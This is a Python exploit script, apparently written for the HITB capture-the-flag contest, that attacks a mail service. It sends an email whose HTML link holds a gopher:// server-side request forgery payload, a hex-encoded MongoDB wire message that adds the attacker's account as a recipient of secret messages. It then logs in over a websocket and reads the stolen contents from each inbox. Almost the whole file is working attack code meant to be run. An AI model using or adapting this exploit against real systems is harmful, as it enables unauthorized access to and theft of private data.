#!/usr/bin/env python3

import socket
import sys
import uuid
import smtplib
import asyncio
import websockets
import json
import re
import base64
from email.message import EmailMessage
from email.headerregistry import Address

SMTP_PORT = 2525
HTTP_PORT = 8080
DOMAIN = 'ctf.hitb.org'
TIMEOUT = 5
USER = 'hacker'
PASSWORD = 'hacker'

# db.inbox.updateMany({subject : "Secret message"}, { $addToSet: { rcpt_to: { "original" : "<hacker@ctf.hitb.org>", "original_host" : "ctf.hitb.org", "host" : "ctf.hitb.org", "user" : "hacker" } } })
EXPLOIT = 'gopher://mongodb:27017/1%47%01%00%00%0b%00%00%00%00%00%00%00%dd%07%00%00%01%00%00%00%01%d8%00%00%00%75%70%64%61%74%65%73%00%cc%00%00%00%03%71%00%21%00%00%00%02%73%75%62%6a%65%63%74%00%0f%00%00%00%53%65%63%72%65%74%20%6d%65%73%73%61%67%65%00%00%03%75%00%8f%00%00%00%03%24%61%64%64%54%6f%53%65%74%00%7f%00%00%00%03%72%63%70%74%5f%74%6f%00%71%00%00%00%02%6f%72%69%67%69%6e%61%6c%00%16%00%00%00%3c%68%61%63%6b%65%72%40%63%74%66%2e%68%69%74%62%2e%6f%72%67%3e%00%02%6f%72%69%67%69%6e%61%6c%5f%68%6f%73%74%00%0d%00%00%00%63%74%66%2e%68%69%74%62%2e%6f%72%67%00%02%68%6f%73%74%00%0d%00%00%00%63%74%66%2e%68%69%74%62%2e%6f%72%67%00%02%75%73%65%72%00%07%00%00%00%68%61%63%6b%65%72%00%00%00%00%08%6d%75%6c%74%69%00%01%08%75%70%73%65%72%74%00%00%00%00%55%00%00%00%02%75%70%64%61%74%65%00%06%00%00%00%69%6e%62%6f%78%00%08%6f%72%64%65%72%65%64%00%01%03%6c%73%69%64%00%1e%00%00%00%05%69%64%00%10%00%00%00%04%c8%0f%10%cd%9f%fa%42%65%8f%c5%47%49%d7%99%16%15%00%02%24%64%62%00%07%00%00%00%65%6d%61%69%6c%73%00%00%af%82%0c%ad'

def send_malicious_email(host):
    msg = EmailMessage()
    msg["Subject"] = "Exploit"
    msg["From"] = Address(username=str(uuid.uuid4()), domain=DOMAIN)
    msg["To"] = Address(username=str(uuid.uuid4()), domain=DOMAIN)

    html = '<html><body><p><a href="%s">LINK</a></p></body></html>' % EXPLOIT

    msg.set_content('Exploit')
    msg.add_alternative(html, subtype='html')

    try:
        print("Connecting to %s:%i" % (host, SMTP_PORT))
        with smtplib.SMTP(host, SMTP_PORT, timeout=TIMEOUT) as s:
            print("Sending malicious email")
            s.send_message(msg)
    except smtplib.SMTPException as e:
        # expected timeout
        print("Expected timeout, malicious email sent")

async def execute_command(ws, command, have_result=True):
    await ws.send(command)

    if have_result:
        result = await ws.recv()
        return json.loads(result)

async def get_flags(host):
    uri = "ws://%s:%i" % (host, HTTP_PORT)
    print("Connecting to %s" % uri)

    try:
        ws = await websockets.connect(uri)
        await execute_command(ws, '80', have_result=False)

        login_result = await execute_command(ws, "login %s %s" % (USER, PASSWORD))
        if login_result['exit_code']:
            print(f"Creating user {USER}")
            await execute_command(ws, "adduser %s %s" % (USER, PASSWORD))
            login_result = await execute_command(ws, "login %s %s" % (USER, PASSWORD))

        print(f"User {USER} successfully logged in")
        print("Reading flags")

        dirs = [re.match(r"^(?P<name>\d+)\/", l).group('name') for l in (await execute_command(ws, "ls"))['output'].splitlines()]
        for d in dirs:
            await execute_command(ws, f"cd {d}")
            text = (await execute_command(ws, "cat text"))['output']
            if text == "See HTML part":
                html = (await execute_command(ws, "cat html"))['output']
                flag = html.splitlines()[1][len("I have a confidential message for you: "):]
            elif text == "See attachments":
                await execute_command(ws, "cd attachments")
                flag = base64.b64decode((await execute_command(ws, "cat secret"))['output']).decode('utf-8')
                await execute_command(ws, "cd ..")
            else:
                flag = text.splitlines()[1][len("I have a confidential message for you: "):]

            print(flag)
            await execute_command(ws, "cd ..")

    finally:
        await ws.close()

async def main(host):
    send_malicious_email(host)
    await get_flags(host)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"USAGE: {sys.argv[0]} <ip>", file=sys.stderr)
        sys.exit(-1)

    asyncio.get_event_loop().run_until_complete(main(sys.argv[1]))
    
